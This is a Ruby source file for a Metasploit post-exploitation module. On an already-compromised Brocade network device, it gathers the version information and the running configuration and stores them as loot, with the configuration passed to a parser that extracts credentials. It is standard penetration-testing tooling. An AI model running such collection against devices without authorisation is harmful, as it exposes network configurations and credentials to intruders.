##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/auxiliary/brocade'

class MetasploitModule < Msf::Post
  include Msf::Auxiliary::Brocade
  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Brocade Gather Device General Information',
      'Description'   => %q{
        This module collects Brocade device information and configuration.
        This module has been tested against an icx6430 running 08.0.20T311.
        },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'h00die'],
      'Platform'      => [ 'brocade'],
      'SessionTypes'  => [ 'shell' ]
    ))
  end

  def run
    # Get device prompt
    prompt = session.shell_command("\n")

    if prompt.end_with?('(config)#') # config shell
      vprint_status('In a config cli')
      session.shell_write("skip-page-display\n")
      session.shell_write("terminal length 0\n")
    elsif prompt.end_with?('#') # regular cli shell (non-config)
      vprint_status('In an enabled cli')
      session.shell_write("skip-page-display\n")
      session.shell_write("terminal length 0\n")
    elsif prompt.end_with?('>') # cli not enabled
      vprint_status('In a non-enabled cli')
    end

    # attempt to disable paging, cli not enabled this will fail anyways
    session.shell_write("skip-page-display\n")
    session.shell_write("terminal length 0\n")

    # Get version info
    print_status('Getting version information')
    version_out = session.shell_command("show version\n")
    if /^, Version: (?<ver>.+) | SW: Version (?<ver>.+) /i =~ version_out
      vprint_status("OS: #{ver}")
    end

    ver_loc = store_loot('brocade.version',
      'text/plain',
      session,
      version_out.strip,
      'version.txt',
      'Brocade Version')

    # Print the version of VERBOSE set to true.
    vprint_good("Version information stored in to loot #{ver_loc}")

    # run additional information gathering
    enum_configs(prompt)
  end

  # run commands found in exec mode under privilege 1
  def enum_configs(prompt)
    host,port = session.session_host, session.session_port
    exec_commands = [
      {
        'cmd'  => 'show configuration',
        'fn'   => 'get_config',
        'desc' => 'Get Device Config on Brocade Device'
      },
    ]
    exec_commands.each do |ec|
      command = ec['cmd']
      cmd_out = session.shell_command(command).gsub(/#{command}|#{prompt}/,"")
      print_status("Gathering info from #{command}")
      # detect if we're in pagination and get as much data as possible
      if cmd_out.include?('--More--')
        cmd_out += session.shell_command(" \n"*20) #20 pages *should* be enough
      end
      if ec['fn'] == 'get_config'
        brocade_config_eater(host,port,cmd_out.strip)
      else
        cmd_loc = store_loot("brocade.#{ec['fn']}",
          "text/plain",
          session,
          cmd_out.strip,
          "#{ec['fn']}.txt",
          ec['desc'])
        vprint_good("Saving to #{cmd_loc}")
      end
    end
  end
end

